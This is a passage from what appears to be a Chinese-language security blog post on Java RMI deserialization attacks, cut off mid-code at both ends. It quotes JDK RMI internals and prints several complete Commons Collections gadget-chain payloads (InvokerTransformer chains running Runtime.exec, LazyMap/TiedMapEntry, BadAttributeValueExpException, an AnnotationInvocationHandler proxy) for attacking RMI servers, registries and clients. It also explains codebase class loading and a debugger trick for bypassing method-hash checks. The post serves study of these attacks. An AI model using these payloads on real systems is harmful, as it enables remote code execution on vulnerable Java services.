Double.valueOf(in.readDouble());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在创建远程服务中系统会默认创建一个DGC，这个的主要功能就是回收机制，但是它的里面就存在和注册中心一样的问题，这里是系统自己创建的回收机制，所以也会存在对应的风险</p>
<p>首先是服务端的回收，里面会创建一个DGCImpl_Skel对象，在调用dispatch方法时就存在反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != -<span class="number">669196253586618813L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">DGCImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (DGCImpl)var1;</span><br><span class="line">        ObjID[] var7;</span><br><span class="line">        <span class="type">long</span> var8;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                VMID var39;</span><br><span class="line">                <span class="type">boolean</span> var40;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var14</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])var14.readObject();</span><br><span class="line">                    var8 = var14.readLong();</span><br><span class="line">                    var39 = (VMID)var14.readObject();</span><br><span class="line">                    var40 = var14.readBoolean();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var36) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var36);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var37) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var37);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.clean(var7, var8, var39, var40);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var35) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var35);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                Lease var10;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var13</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])var13.readObject();</span><br><span class="line">                    var8 = var13.readLong();</span><br><span class="line">                    var10 = (Lease)var13.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var32);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var33) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var33);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Lease</span> <span class="variable">var11</span> <span class="operator">=</span> var6.dirty(var7, var8, var10);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var12</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var12.writeObject(var11);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var31) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var31);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>客户端也是一样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, VMID var4, <span class="type">boolean</span> var5)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">0</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var7</span> <span class="operator">=</span> var6.getOutputStream();</span><br><span class="line">            var7.writeObject(var1);</span><br><span class="line">            var7.writeLong(var2);</span><br><span class="line">            var7.writeObject(var4);</span><br><span class="line">            var7.writeBoolean(var5);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var8);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var6);</span><br><span class="line">        <span class="built_in">super</span>.ref.done(var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var9;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var10) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var10;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var11);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Lease <span class="title function_">dirty</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getOutputStream();</span><br><span class="line">            var6.writeObject(var1);</span><br><span class="line">            var6.writeLong(var2);</span><br><span class="line">            var6.writeObject(var4);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var20);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var5);</span><br><span class="line"></span><br><span class="line">        Lease var24;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">var9</span> <span class="operator">=</span> var5.getInputStream();</span><br><span class="line">            var24 = (Lease)var9.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var17) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var17);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var18);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.ref.done(var5);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var24;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var21) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var21;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var22) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var22;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var23);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="攻击服务端的反序列化"><a href="#攻击服务端的反序列化" class="headerlink" title="攻击服务端的反序列化"></a>攻击服务端的反序列化</h3><p>首先需要在服务端出现对应的cc与或者cb依赖，这里就以cc3依赖来进行攻击</p>
<h4 id="恶意参数上传"><a href="#恶意参数上传" class="headerlink" title="恶意参数上传"></a>恶意参数上传</h4><p>这里在上面就提到，在客户端调用服务端的方法时，如果方法里面有参数，服务端会通过unmarshalValue反序列化客户端的上传参数，如果我们的参数是一个恶意的对象就可以实现攻击，首先就先定义一个接收Object对象的类</p>
<p><img src="https://luokuang1.github.io/images/rmi30.png" width="95%" height="80%"></p>
<p>下面就是创建一个危险类来作为参数传递</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Eval</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">geteval</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transform</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; q= LazyMap.decorate(map,transform);</span><br><span class="line">        TiedMapEntry tiedmapentry=<span class="keyword">new</span>  <span class="title class_">TiedMapEntry</span>(q,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; o = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        o.put(tiedmapentry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Class c=transform.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transform,transformers);</span><br><span class="line">        q.remove(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/rmi31.png" width="95%" height="80%"></p>
<p>这里也是成功的执行了，因为上面的执行的要求太高需要对应的方法的参数接收Object对象，如果不是可以吗? 如果直接传肯定是不可以的</p>
<p><img src="https://luokuang1.github.io/images/rmi32.png" width="95%" height="80%"></p>
<p>下面就去找找看是否可以绕过这层关系，从而实现反序列化这里可以看到报错的信息为hash未被找到，这里其实就会去以前创建的hashtable里面进行寻找，如果没有找到就会先这样进行报错，这里可以通过debug模式将要发送到服务端的方法进行修改即可</p>
<p>在 RemoteObjectInvocationHandler 的invokeRemote方法处下断点，将 Method 改为服务端存在的RMIObject的getName</p>
<h4 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h4><p>这里需要有三个前提</p>
<p>1.Server 端必须加载和配置好 SecurityManager</p>
<p>2.java.rmi.Sever.useCodebaseOnly必须开启 </p>
<p>3.版本必须是 6u45/7u21 之前</p>
<p>前面可以发现在UnicastServerRef的dispatch方法调用到UnicastRef的<em>unmarshalValue进行</em>反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">unmarshalValue</span><span class="params">(Class&lt;?&gt; type, ObjectInput in)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (type.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="type">int</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Integer.valueOf(in.readInt());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(in.readBoolean());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">byte</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Byte.valueOf(in.readByte());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">char</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Character.valueOf(in.readChar());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">short</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Short.valueOf(in.readShort());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">long</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Long.valueOf(in.readLong());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">float</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Float.valueOf(in.readFloat());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">double</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Double.valueOf(in.readDouble());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在反序列化的过程中，会调用到MarshalInputStream的resolveClass方法来解析Class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass classDesc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">annotation</span> <span class="operator">=</span> readLocation();</span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> classDesc.getName();</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">defaultLoader</span> <span class="operator">=</span></span><br><span class="line">        skipDefaultResolveClass ? <span class="literal">null</span> : latestUserDefinedLoader();</span><br><span class="line">    <span class="type">String</span> <span class="variable">codebase</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!useCodebaseOnly &amp;&amp; annotation <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        codebase = (String) annotation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> RMIClassLoader.loadClass(codebase, className,</span><br><span class="line">                                        defaultLoader);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AccessControlException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> checkSunClass(className, e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (Character.isLowerCase(className.charAt(<span class="number">0</span>)) &amp;&amp;</span><br><span class="line">                className.indexOf(<span class="string">&#x27;.&#x27;</span>) == -<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(classDesc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e2) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里会先调用readLocation获取到 Codebase 的地址，后面就会检测useCodebaseOnly是否开启，所以这里需要有一个服务器先开启此服务，下面就可以直接到RMIClassLoader的loadClass方法，一直调用到LoaderHandler的loadClass方法里面，这里主要调用了loadClassForName方法，下面跟进就可以看到类加载的函数Class.<em>forName</em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lass&lt;?&gt; c = loadClassForName(name, <span class="literal">false</span>, defaultLoader);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Class&lt;?&gt; loadClassForName(String name,</span><br><span class="line">                                          <span class="type">boolean</span> initialize,</span><br><span class="line">                                          ClassLoader loader)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (loader == <span class="literal">null</span>) &#123;</span><br><span class="line">        ReflectUtil.checkPackageAccess(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Class.forName(name, initialize, loader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="攻击-Registry-端的反序列化"><a href="#攻击-Registry-端的反序列化" class="headerlink" title="攻击 Registry 端的反序列化"></a>攻击 Registry 端的反序列化</h3><p>这里需要先找到Registry端的反序列化点，这里是可以分为客户端和服务端对其的攻击，但是主要分析服务端攻击注册中心</p>
<p><strong>客户端</strong></p>
<p>在上面分析就知道，在客户端调用lookup方法时，会将我们传入的字符串进行反序列化，但是由于这里只能传入，我们传入一个恶意类来实现攻击</p>
<p><strong>服务端</strong></p>
<p>这里可以在bind方法里面写入恶意类来实现代码执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Class&lt;?&gt; c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor=c.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;a&quot;</span>,geteval());</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler=(InvocationHandler) constructor.newInstance(Target.class,map);</span><br><span class="line">        Remote remote= (Remote)  Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;,invocationHandler);</span><br><span class="line"></span><br><span class="line">        Naming.bind(<span class="string">&quot;luokuang&quot;</span>,remote);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">geteval</span><span class="params">()</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transform</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; q= LazyMap.decorate(map,transform);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">luokuang</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(q, <span class="string">&quot;luokuang&quot;</span>);</span><br><span class="line"><span class="comment">//        luokuang.toString();</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        Class c=badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,luokuang);</span><br><span class="line">        <span class="keyword">return</span> badAttributeValueExpException;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="攻击客户端的反序列化"><a href="#攻击客户端的反序列化" class="headerlink" title="攻击客户端的反序列化"></a>攻击客户端的反序列化</h3><p>上面分析知道，在客户端处理所有的网络请求时都会调用executeCall方法，这里就可以利用这一点来通过服务端对客户端进行攻击，虽然大多的场景用不到，但是还是可以去了解一下</p>
<p>首先通过调用服务端恶意方法的返回一个恶意对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor=c.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;a&quot;</span>,geteval());</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler=(InvocationHandler) constructor.newInstance(Target.class,map);</span><br><span class="line">        Remote remote= (Remote)  Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;,invocationHandler);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1088</span>);</span><br><span class="line">        RMIObject AAA=<span class="keyword">new</span> <span class="title class_">RMIObject</span>();</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://localhost:1088/luokuang&quot;</span>, AAA);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getName</span><span class="params">(Object aaa)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Object aa=geteval();</span><br><span class="line">    <span class="keyword">return</span> aa;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">geteval</span><span class="params">()</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transform</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title 